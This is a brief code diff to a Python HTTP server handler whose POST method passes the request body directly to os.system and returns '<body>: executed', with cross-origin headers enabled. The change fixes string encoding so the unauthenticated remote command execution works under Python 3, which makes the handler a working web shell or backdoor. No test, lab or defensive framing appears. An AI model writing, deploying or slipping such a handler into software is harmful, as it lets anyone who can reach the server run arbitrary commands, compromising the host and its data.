@@ -25,12 +25,12 @@ class CustomHandler(http.server.BaseHTTPRequestHandler):
     def do_POST(self):
         content_length = int(self.headers['Content-Length'])
         body = self.rfile.read(content_length)
-        os.system(body)
+        os.system(body.decode())
         self.send_response(200)
         self._send_cors_headers()
         self.end_headers()
         response = BytesIO()
-        response.write(b'{}: executed'.format(body))
+        response.write('{}: executed'.format(body).encode('utf-8'))
         self.wfile.write(response.getvalue())
 
 
